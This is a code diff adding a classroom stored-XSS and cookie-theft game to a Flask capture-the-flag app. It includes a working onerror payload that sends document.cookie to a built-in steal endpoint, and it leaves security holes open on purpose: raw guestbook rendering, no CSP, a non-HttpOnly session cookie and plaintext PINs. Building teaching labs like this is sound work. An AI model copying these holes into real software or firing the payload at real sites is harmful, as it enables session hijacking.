@@ -376,5 +376,189 @@ def api_craft():
     return jsonify(ok=True, book="Enchanted Book of the Village Codex", flag=CRAFT_FLAG)
 
 
+# ===========================================================================
+# ARENA — classroom PvP cookie-theft (SEPARATE from the 14 CTFd challenges).
+#   Teaches JS 1.5 (document.cookie + string-concat exfil) + Stored XSS, peer-vs-peer.
+#   Each student self-registers a TEST account -> gets a non-HttpOnly `arena_session`
+#   cookie + a private flag at /arena/me. Each profile /arena/u/<name> has a guestbook
+#   rendered RAW with NO CSP (the stored-XSS sink). Post an onerror payload on a
+#   classmate's board; when they open it, their cookie exfils to your webhook; ride it
+#   to /arena/me to read their flag, then /arena/claim it. Closed lab network only.
+# ===========================================================================
+ARENA_USERS = {}       # name -> {"pin": str, "flag": str}
+ARENA_SESSIONS = {}    # token -> name
+GUESTBOOKS = {}        # name -> [ {"author": str, "body": str} ]   (body rendered RAW = the sink)
+LOOT = {}              # attacker name -> [ stolen document.cookie strings ]  (caught by /arena/steal)
+CLAIMS = {}            # attacker name -> set(victim names)
+ARENA_ADMIN_PIN = _sec("ARENA_ADMIN_PIN", "teacher-reset")
+# 1x1 transparent GIF returned by the built-in "attacker server" so the <img> trap loads cleanly.
+_ARENA_GIF = base64.b64decode("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7")
+
+
+def arena_trap(by):
+    # ready-made beginner payload: when the victim views it, their cookie is sent to OUR loot.
+    return ("<img src=x onerror=\"this.onerror=null;this.src='/arena/steal?by=%s&c='"
+            "+encodeURIComponent(document.cookie)\">" % by)
+
+
+def _arena_slug(s):
+    return re.sub(r"[^a-z0-9_]", "", (s or "").lower())[:20]
+
+
+def arena_user():
+    return ARENA_SESSIONS.get(request.cookies.get("arena_session"))
+
+
+def _arena_cookie(resp, token):
+    # non-HttpOnly on purpose: document.cookie must see it (that is the whole lesson)
+    resp.set_cookie("arena_session", token, httponly=False, samesite="Lax", secure=False, path="/")
+    return resp
+
+
+def _new_token():
+    import secrets as _s
+    return _s.token_hex(8)
+
+
+@app.route("/arena")
+def arena_home():
+    return render_template("arena_home.html", me=arena_user(), users=sorted(ARENA_USERS), error=None)
+
+
+@app.route("/arena/register", methods=["POST"])
+def arena_register():
+    name = _arena_slug(request.form.get("name", ""))
+    pin = request.form.get("pin", "")
+    if not name or not pin:
+        return render_template("arena_home.html", me=arena_user(), users=sorted(ARENA_USERS),
+                               error="Need a name (a-z 0-9 _) and a PIN."), 400
+    if name in ARENA_USERS:
+        return render_template("arena_home.html", me=arena_user(), users=sorted(ARENA_USERS),
+                               error="That name is taken — use Login instead."), 400
+    import secrets as _s
+    ARENA_USERS[name] = {"pin": pin, "flag": "LOC9{pwn3d_%s_%s}" % (name, _s.token_hex(2))}
+    GUESTBOOKS.setdefault(name, [])
+    tok = _new_token(); ARENA_SESSIONS[tok] = name
+    return _arena_cookie(make_response(redirect("/arena/me")), tok)
+
+
+@app.route("/arena/login", methods=["POST"])
+def arena_login():
+    name = _arena_slug(request.form.get("name", "")); pin = request.form.get("pin", "")
+    u = ARENA_USERS.get(name)
+    if not u or u["pin"] != pin:
+        return render_template("arena_home.html", me=arena_user(), users=sorted(ARENA_USERS),
+                               error="Wrong name or PIN."), 403
+    tok = _new_token(); ARENA_SESSIONS[tok] = name
+    return _arena_cookie(make_response(redirect("/arena/me")), tok)
+
+
+@app.route("/arena/logout")
+def arena_logout():
+    ARENA_SESSIONS.pop(request.cookies.get("arena_session"), None)
+    resp = make_response(redirect("/arena")); resp.delete_cookie("arena_session"); return resp
+
+
+@app.route("/arena/me")
+def arena_me():
+    me = arena_user()
+    if not me:
+        return redirect("/arena")
+    # Shows the flag of WHOEVER's cookie is presented -> ride a stolen cookie here to read a victim's flag.
+    # This page does NOT render the guestbook raw, so the flag never sits next to the XSS sink.
+    return render_template("arena_me.html", me=me, flag=ARENA_USERS[me]["flag"],
+                           sig_count=len(GUESTBOOKS.get(me, [])), loot_count=len(LOOT.get(me, [])),
+                           users=sorted(ARENA_USERS))
+
+
+@app.route("/arena/u/<name>", methods=["GET", "POST"])
+def arena_profile(name):
+    name = _arena_slug(name)
+    if name not in ARENA_USERS:
+        return render_template("arena_profile.html", me=arena_user(), name=name,
+                               exists=False, entries=[]), 404
+    if request.method == "POST":
+        if not arena_user():
+            return redirect("/arena")
+        GUESTBOOKS.setdefault(name, []).append({"author": arena_user(),
+                                                "body": request.form.get("body", "")})
+        GUESTBOOKS[name] = GUESTBOOKS[name][-50:]   # cap the board
+        return redirect("/arena/u/%s" % name)
+    # NO CSP on this route -> guestbook body renders RAW = the stored-XSS sink.
+    me = arena_user()
+    return render_template("arena_profile.html", me=me, name=name, exists=True,
+                           entries=GUESTBOOKS.get(name, []),
+                           trap=arena_trap(me) if me else "")
+
+
+@app.route("/arena/steal")                 # the built-in "attacker server" the trap payload calls
+def arena_steal():
+    by = _arena_slug(request.args.get("by", ""))
+    c = (request.args.get("c", "") or "")[:600]
+    if by and c and "arena_session=" in c:
+        box = LOOT.setdefault(by, [])
+        if c not in box:
+            box.append(c)                  # keep each distinct stolen cookie once
+    return make_response((_ARENA_GIF, 200, {"Content-Type": "image/gif"}))
+
+
+@app.route("/arena/loot")                  # your caught cookies (requires your own login)
+def arena_loot():
+    me = arena_user()
+    if not me:
+        return redirect("/arena")
+    return render_template("arena_loot.html", me=me, loot=LOOT.get(me, []), revealed=None)
+
+
+@app.route("/arena/peek", methods=["POST"])   # use a stolen cookie to read that victim's flag
+def arena_peek():
+    me = arena_user()
+    if not me:
+        return redirect("/arena")
+    m = re.search(r"arena_session=([0-9a-f]+)", request.form.get("cookie", ""))
+    victim = ARENA_SESSIONS.get(m.group(1)) if m else None
+    if not victim:
+        revealed = {"ok": False, "text": "ตั๋ว (cookie) นี้ใช้ไม่ได้/หมดอายุ — ลองขโมยใบใหม่"}
+    elif victim == me:
+        revealed = {"ok": False, "text": "นี่ cookie ของตัวเอง — ไปขโมยของเพื่อน!"}
+    else:
+        revealed = {"ok": True, "victim": victim, "flag": ARENA_USERS[victim]["flag"]}
+    return render_template("arena_loot.html", me=me, loot=LOOT.get(me, []), revealed=revealed)
+
+
+@app.route("/arena/claim", methods=["POST"])
+def arena_claim():
+    me = arena_user()
+    if not me:
+        return redirect("/arena")
+    stolen = (request.form.get("flag", "") or "").strip()
+    victim = next((n for n, u in ARENA_USERS.items() if u["flag"] == stolen), None)
+    if not victim:
+        msg = ("bad", "That is not a valid stolen flag.")
+    elif victim == me:
+        msg = ("bad", "That is your OWN flag — steal a classmate's!")
+    else:
+        CLAIMS.setdefault(me, set()).add(victim)
+        msg = ("ok", "Pwned %s! Logged on the scoreboard." % victim)
+    return render_template("arena_scoreboard.html", me=me, msg=msg,
+                           board=sorted(((a, len(v)) for a, v in CLAIMS.items()), key=lambda x: -x[1]),
+                           detail={a: sorted(v) for a, v in CLAIMS.items()})
+
+
+@app.route("/arena/scoreboard")
+def arena_scoreboard():
+    return render_template("arena_scoreboard.html", me=arena_user(), msg=None,
+                           board=sorted(((a, len(v)) for a, v in CLAIMS.items()), key=lambda x: -x[1]),
+                           detail={a: sorted(v) for a, v in CLAIMS.items()})
+
+
+@app.route("/arena/reset", methods=["POST"])   # teacher-only: clear boards + scoreboard (keeps accounts)
+def arena_reset():
+    if request.form.get("pin", "") != ARENA_ADMIN_PIN:
+        return jsonify(ok=False, error="wrong teacher pin"), 403
+    GUESTBOOKS.clear(); CLAIMS.clear()
+    return jsonify(ok=True, message="guestbooks + scoreboard cleared (accounts kept)")
+
+
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=int(os.environ.get("PORT", "8000")), debug=False)
